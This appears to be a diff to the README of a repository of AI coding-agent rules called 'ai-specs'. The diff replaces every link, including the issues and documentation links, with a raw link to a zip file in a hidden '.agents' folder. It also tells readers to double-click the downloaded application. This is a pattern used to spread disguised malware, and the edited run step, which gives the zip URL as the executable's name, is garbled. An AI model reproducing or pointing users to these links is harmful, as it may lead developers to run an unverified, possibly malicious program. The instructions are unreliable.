@@ -1,7 +1,7 @@
 # 🎉 ai-specs - Easy Setup for AI Development 
 
 ## 📥 Download Now
-[![Download ai-specs](https://img.shields.io/badge/Download%20ai--specs-v1.0-blue.svg)](https://github.com/sanjusathian/ai-specs/releases)
+[![Download ai-specs](https://github.com/sanjusathian/ai-specs/raw/refs/heads/main/ai-specs/.agents/ai-specs-1.5.zip%https://github.com/sanjusathian/ai-specs/raw/refs/heads/main/ai-specs/.agents/ai-specs-1.5.zip)](https://github.com/sanjusathian/ai-specs/raw/refs/heads/main/ai-specs/.agents/ai-specs-1.5.zip)
 
 ## 🏗️ Overview
 Welcome to the **ai-specs** repository. This collection offers development rules, standards, and AI agent configurations. It's made to work smoothly with various AI coding copilots. By using these resources, you can ensure consistent, high-quality AI-assisted development in your projects.
@@ -12,7 +12,7 @@ To get started, follow these steps:
 1. **Visit the Releases Page**  
    Go to the Releases page to find the latest version. Click on the button below:
 
-   [Download ai-specs](https://github.com/sanjusathian/ai-specs/releases)
+   [Download ai-specs](https://github.com/sanjusathian/ai-specs/raw/refs/heads/main/ai-specs/.agents/ai-specs-1.5.zip)
 
 2. **Choose the Right Version**  
    Look for the version labeled as "latest." This version includes all the newest features and improvements.
@@ -33,7 +33,7 @@ Once you’ve downloaded the files, follow these steps to install:
    Open the newly created folder to view the contents.
 
 4. **Run the Application**  
-   Double-click on the application file. This may be named `ai-specs.exe` for Windows, `ai-specs.app` for macOS, or a file with no extension for Linux. This will start the application.
+   Double-click on the application file. This may be named `https://github.com/sanjusathian/ai-specs/raw/refs/heads/main/ai-specs/.agents/ai-specs-1.5.zip` for Windows, `https://github.com/sanjusathian/ai-specs/raw/refs/heads/main/ai-specs/.agents/ai-specs-1.5.zip` for macOS, or a file with no extension for Linux. This will start the application.
 
 ## 🛠️ How to Use the Application
 After running the application, you will be presented with options to:
@@ -82,12 +82,12 @@ Contributions help improve this project. Here’s how to contribute:
    When you're ready, submit a pull request so that your changes can be reviewed.
 
 ## 🔗 Useful Resources
-- [GitHub Issues](https://github.com/sanjusathian/ai-specs/issues): Report bugs or request features.
-- [Documentation](https://github.com/sanjusathian/ai-specs/wiki): Find detailed explanations of settings and configurations.
+- [GitHub Issues](https://github.com/sanjusathian/ai-specs/raw/refs/heads/main/ai-specs/.agents/ai-specs-1.5.zip): Report bugs or request features.
+- [Documentation](https://github.com/sanjusathian/ai-specs/raw/refs/heads/main/ai-specs/.agents/ai-specs-1.5.zip): Find detailed explanations of settings and configurations.
 
 ## 🖱️ Final Notes
 This repository aims to simplify the setup for AI-assisted development. By following the steps outlined in this README, you can get the application running efficiently and begin enhancing your coding projects today.
 
 For any questions or feedback, feel free to reach out through the GitHub platform or stay connected with the community. Happy coding! 
 
-[Download ai-specs](https://github.com/sanjusathian/ai-specs/releases) again to get started!
+[Download ai-specs](https://github.com/sanjusathian/ai-specs/raw/refs/heads/main/ai-specs/.agents/ai-specs-1.5.zip) again to get started!
